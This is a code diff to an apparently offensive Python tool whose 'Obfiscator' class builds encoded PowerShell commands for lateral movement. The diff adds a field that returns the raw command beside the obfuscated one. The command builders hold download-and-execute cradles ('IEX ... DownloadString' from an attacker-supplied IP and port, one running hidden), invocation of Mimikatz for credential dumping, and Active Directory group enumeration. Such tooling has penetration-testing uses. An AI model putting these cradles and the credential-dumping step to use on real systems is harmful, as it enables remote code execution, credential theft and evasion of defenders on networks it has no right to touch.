@@ -55,6 +55,7 @@ class Obfiscator:
         self.methods = methods
         self.group = group
         self.command = ""
+        self.unprotected_command = ""
         try:
             self.run()
         except Exception, e:
@@ -83,7 +84,7 @@ class Obfiscator:
 
     def return_command(self):
         try:
-            return(self.command)
+            return(self.command, self.unprotected_command)
         except Exception, e:
             print("[!] There was an error %s") % (str(e))
             sys.exit(1)
@@ -92,16 +93,19 @@ class Obfiscator:
         # Invoke Mimikatz Directly
         text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
         self.command = self.packager(text)
+        self.unprotected_command = text
 
     def downloader(self):
         # Download String Directly
         text = "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://%s:%s/'))" % (str(self.src_ip), str(self.src_port))
         self.command = self.packager(text)
+        self.unprotected_command = text
 
     def group_members(self):
         # Group Membership
         text = "Get-ADGroupMember -identity %s -Recursive | Get-ADUser -Property DisplayName | Select Name,ObjectClass,DisplayName" % (str(self.group))
         self.command = self.packager(text)
+        self.unprotected_command = text
 
 def get_interfaces():
     interfaces = netifaces.interfaces()
@@ -259,6 +263,7 @@ Create Pasteable Double Encoded Script:
     no_output = False
     execution = ""
     supplement = ""
+    unprotected_command = ""
     hash = None
     methods = False
     method_dict = {}
@@ -315,19 +320,19 @@ Create Pasteable Double Encoded Script:
     if invoker:
         execution = "invoker"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
-        command = x.return_command()
+        command, unprotected_command = x.return_command()
     if downloader:
         execution = "downloader"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
-        command = x.return_command()
+        command, unprotected_command = x.return_command()
     elif psexec_cmd and invoker:
         execution = "psexec"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
-        command = x.return_command()
+        command, unprotected_command = x.return_command()
     elif group:
         execution = "group"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
-        command = x.return_command()
+        command, unprotected_command = x.return_command()
 
     if "invoker" in execution and not wmiexec_cmd:
         supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
